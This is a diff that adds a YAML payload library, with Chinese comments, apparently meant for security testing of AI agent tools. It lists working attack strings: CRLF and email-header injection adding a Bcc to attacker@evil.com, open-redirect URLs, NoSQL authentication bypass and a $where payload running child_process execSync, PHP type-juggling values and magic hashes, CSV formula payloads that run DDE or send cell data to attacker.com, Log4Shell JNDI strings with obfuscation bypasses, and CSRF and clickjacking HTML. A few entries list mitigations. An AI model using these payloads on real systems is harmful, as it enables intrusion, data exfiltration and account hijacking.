@@ -1,0 +1,223 @@
+# 杂项 Payload 库 — CRLF / Open Redirect / NoSQL / Type Juggling / CSV / JNDI / etc.
+# 这些 hack-skills 在 Agent 场景的快速参考
+
+# ============ CRLF Injection ============
+metadata_crlf:
+  source: hack-skills/crlf-injection
+  scope: agent tool params → HTTP 头 / 日志 / 邮件头拼接
+  layer: L1_user_input
+crlf:
+  description: 在 HTTP 响应头、日志、邮件头中注入换行
+  payloads:
+    - payload: "%0d%0aSet-Cookie: admin=true"
+      purpose: HTTP 响应拆分
+    - payload: "\\r\\nX-Injected: header"
+      purpose: 日志注入
+    - payload: "user@example.com%0d%0aBcc: attacker@evil.com"
+      purpose: 邮件头注入
+  agent_specific:
+    description: |
+      Agent 邮件工具（如 send_email）若拼接用户输入到 headers 字段
+    high_risk:
+      - "send_email"
+      - "log_event"
+      - "set_response_header"
+      - "add_http_header"
+    attack: "用户控制 from/subject → 注入 \\r\\nBcc: attacker"
+    impact: "邮件外泄 / 响应拆分"
+
+# ============ Open Redirect ============
+metadata_openredirect:
+  source: hack-skills/open-redirect
+  scope: agent redirect URL 工具
+  layer: L1_user_input
+open_redirect:
+  payloads:
+    - "//attacker.com"
+    - "https://attacker.com"
+    - "/\\attacker.com"
+    - "/%5cattacker.com"
+    - "https://trusted.com@attacker.com"
+    - "https://trusted.com.attacker.com"
+    - "javascript:alert(1)"
+    - "data:text/html,<script>alert(1)</script>"
+  agent_specific:
+    description: |
+      Agent 工具如 generate_login_link / oauth_redirect 接受 redirect URL
+    high_risk:
+      - "redirect_to"
+      - "generate_link"
+      - "oauth_redirect"
+    attack: "受害点击生成的链接 → 重定向到 attacker"
+    impact: "钓鱼 / OAuth 绑定劫持"
+
+# ============ NoSQL Injection ============
+metadata_nosql:
+  source: hack-skills/nosql-injection
+  scope: MongoDB / Couchbase 类后端
+  layer: L3_tool_call
+nosql:
+  description: "MongoDB 等 NoSQL 数据库的注入"
+  auth_bypass:
+    - payload: '{"username": {"$ne": ""}, "password": {"$ne": ""}}'
+      purpose: 永真条件
+    - payload: '{"username": "admin", "password": {"$gt": ""}}'
+      purpose: $gt 比较
+  data_extraction:
+    - payload: '{"username": {"$regex": ".*"}}'
+      purpose: regex 模糊
+    - payload: '{"$where": "this.username == \'admin\'"}'
+      purpose: JavaScript where 子句
+  rce:
+    - payload: '{"$where": "function(){return (require(\'child_process\')).execSync(\'id\')}" }'
+      purpose: 服务端 JS 执行
+  agent_specific:
+    high_risk:
+      - "mongo_query"
+      - "find_user"
+      - "search_documents"
+
+# ============ Type Juggling ============
+metadata_typejuggling:
+  source: hack-skills/type-juggling
+  scope: PHP / 弱类型语言后端 Agent
+  layer: L3_tool_call
+type_juggling:
+  description: PHP == 松散比较导致绕过
+  payloads:
+    - payload: '{"password": true}'
+      purpose: "true == '任何非空字符串' → 通过"
+    - payload: '{"password": 0}'
+      purpose: "0 == '字符串以非数字开头' → 通过"
+    - payload: '{"password": []}'
+      purpose: "[] == 0 in older PHP"
+    - payload: '0e123456789'
+      purpose: "magic hash 0e..."
+  php_magic_hashes:
+    - md5: ["240610708", "QNKCDZO", "aabg7XSs"]  # md5('...') 以 0e 开头
+    - sha1: ["aaroZmOk", "aaK1STfY", "aaO8zKZF"]
+  agent_specific:
+    description: "Agent 后端用 PHP 时存在"
+
+# ============ CSV Formula Injection ============
+metadata_csv:
+  source: hack-skills/csv-formula-injection
+  scope: "导出 CSV / Excel 文件的工具"
+  layer: L3_tool_call
+csv_formula:
+  description: |
+    当字段以 = + - @ 等字符开始时，Excel/LibreOffice 解释为公式
+  payloads:
+    - payload: "=cmd|' /c calc'!A1"
+      purpose: "Excel DDE 执行"
+    - payload: "=HYPERLINK(\"http://attacker.com?data=\"&A1, \"Click\")"
+      purpose: "数据外泄"
+    - payload: "=IMPORTXML(\"http://attacker.com/\"&A1, \"/\")"
+      purpose: "数据外泄（Google Sheets）"
+    - payload: "@SUM(1+1)*cmd|'/c calc'!A1"
+    - payload: "+1+1+cmd|'/c calc'!A1"
+  agent_specific:
+    description: "Agent 工具 export_csv / generate_report 接受用户字段值"
+    high_risk:
+      - "export_csv"
+      - "generate_report"
+      - "export_excel"
+    attack: "用户提交 =cmd|... → 受害者打开 CSV 触发 DDE"
+
+# ============ JNDI Injection ============
+metadata_jndi:
+  source: hack-skills/jndi-injection
+  scope: Java 后端日志/反序列化
+  layer: L3_tool_call
+jndi:
+  description: |
+    Log4Shell (CVE-2021-44228) 类漏洞
+    攻击者控制字符串进入日志 → ${jndi:ldap://...}
+  payloads:
+    - payload: "${jndi:ldap://attacker.com/x}"
+    - payload: "${jndi:dns://attacker.com}"
+    - payload: "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}"
+      purpose: 字符串绕过
+    - payload: "${${lower:j}${lower:n}${lower:d}i:ldap://attacker.com}"
+      purpose: 大小写绕过
+  bypasses:
+    - "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}"
+    - "${${env:X:--j}ndi:ldap://attacker.com}"
+  agent_specific:
+    description: "Java Agent 后端用 log4j < 2.15.0"
+    high_risk:
+      - "log_user_action"
+      - "log_query"
+      - "log_tool_call"
+    attack: "Agent log 工具接受 user input → log4j 解析 → JNDI → RCE"
+
+# ============ CSRF ============
+csrf:
+  source: hack-skills/csrf-cross-site-request-forgery
+  payloads:
+    - "<form action='https://agent.com/api/transfer' method='POST'><input name='to' value='attacker'><input name='amount' value='1000'></form><script>document.forms[0].submit()</script>"
+  agent_specific:
+    description: "Agent API 接受 CORS 时特别高风险"
+    high_risk:
+      - "transfer"
+      - "update_settings"
+      - "delete_account"
+      - "change_password"
+    mitigation:
+      - "SameSite=Strict cookie"
+      - "Origin/Referer 校验"
+      - "CSRF token"
+
+# ============ CORS Misconfiguration ============
+cors:
+  source: hack-skills/cors-cross-origin-misconfiguration
+  dangerous_headers:
+    - "Access-Control-Allow-Origin: * 配合 Access-Control-Allow-Credentials: true（不可能配错，但实际存在）"
+    - "Access-Control-Allow-Origin: null（浏览器 sandbox iframe 触发）"
+    - "Origin 反射但无 Vary: Origin（缓存投毒）"
+  agent_specific:
+    description: "Agent API 配置 CORS 时"
+    attack: "恶意页面 fetch('/api/user/data', credentials: 'include')"
+    mitigation:
+      - "严格 origin 白名单"
+      - "Vary: Origin 响应头"
+      - "不要反射 Origin"
+
+# ============ Clickjacking ============
+clickjacking:
+  source: hack-skills/clickjacking
+  payload: "<iframe src='https://agent.com/dangerous-action' style='opacity:0'></iframe>"
+  mitigation:
+    - "X-Frame-Options: DENY"
+    - "Content-Security-Policy: frame-ancestors 'none'"
+
+# ============ SAML / OAuth / WS 简表 ============
+saml:
+  source: hack-skills/saml-sso-assertion-attacks
+  attacks:
+    - "签名剥离"
+    - "XSW (XML Signature Wrapping)"
+    - "assertion 篡改"
+websocket:
+  source: hack-skills/websocket-security
+  attacks:
+    - "CSWSH (Cross-Site WebSocket Hijacking)"
+    - "Origin 校验缺失"
+request_smuggling:
+  source: hack-skills/request-smuggling
+  techniques:
+    - "CL.TE / TE.CL"
+    - "HTTP/2 downgrade"
+api_auth:
+  source: hack-skills/api-auth-and-jwt-abuse
+  see: "jwt-oauth.yaml"
+api_authorization:
+  source: hack-skills/api-authorization-and-bola
+  description: "BOLA / IDOR — Agent 中特别重要（用户 ID 拼接 → 越权）"
+graphql:
+  source: hack-skills/graphql-and-hidden-parameters
+  attacks:
+    - "Introspection 暴露 schema"
+    - "深度限制 DoS"
+    - "Batch query abuse"
+    - "Authorization bypass"
